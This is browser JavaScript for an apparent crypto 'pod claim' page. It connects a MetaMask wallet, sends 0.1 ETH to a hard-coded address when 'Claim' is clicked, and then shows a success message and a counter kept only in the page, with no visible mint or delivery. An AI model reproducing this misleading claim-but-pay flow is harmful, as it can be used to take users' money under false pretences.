const connectBtn = document.getElementById('connect-btn');
const claimBtn = document.getElementById('claim-btn');
const walletStatus = document.getElementById('wallet-status');
const walletAddressSpan = document.getElementById('wallet-address');
const statusMsg = document.getElementById('status-msg');
const podCounter = document.getElementById('pod-counter');

let signer;
let provider;
let userAddress = null;
let podsClaimed = 0;

const RECEIVE_ADDRESS = "0x9411dE226a239f05CeBfDf0b8A7A22e3101d4B09";

async function connectWallet() {
  if (!window.ethereum) {
    statusMsg.innerText = "Install MetaMask!";
    statusMsg.className = "status-msg error";
    return;
  }

  try {
    await window.ethereum.request({ method: "eth_requestAccounts" });
    provider = new ethers.BrowserProvider(window.ethereum);
    signer = await provider.getSigner();
    userAddress = await signer.getAddress();

    walletAddressSpan.innerText = userAddress.slice(0, 6) + "..." + userAddress.slice(-4);
    walletStatus.style.display = "block";
    connectBtn.style.display = "none";
    claimBtn.disabled = false;
    statusMsg.innerText = "";

  } catch (err) {
    statusMsg.innerText = "Wallet connection rejected.";
    statusMsg.className = "status-msg error";
  }
}

connectBtn.addEventListener('click', connectWallet);

claimBtn.addEventListener('click', async () => {
  if (!signer || !userAddress) return;

  claimBtn.disabled = true;
  statusMsg.innerText = "Processing transaction...";
  statusMsg.className = "status-msg";

  try {
    const tx = await signer.sendTransaction({
      to: RECEIVE_ADDRESS,
      value: ethers.parseEther("0.1")
    });
    await tx.wait();

    statusMsg.innerText = "Success! Pod Claimed. 🚀";
    statusMsg.className = "status-msg success";
    podsClaimed++;
    updatePodCounter();

  } catch (err) {
    statusMsg.innerText = "Transaction cancelled or failed.";
    statusMsg.className = "status-msg error";
  }

  claimBtn.disabled = false;
});

function updatePodCounter() {
  podCounter.innerText = `🌕 ${podsClaimed}/88 Pods Claimed`;
}
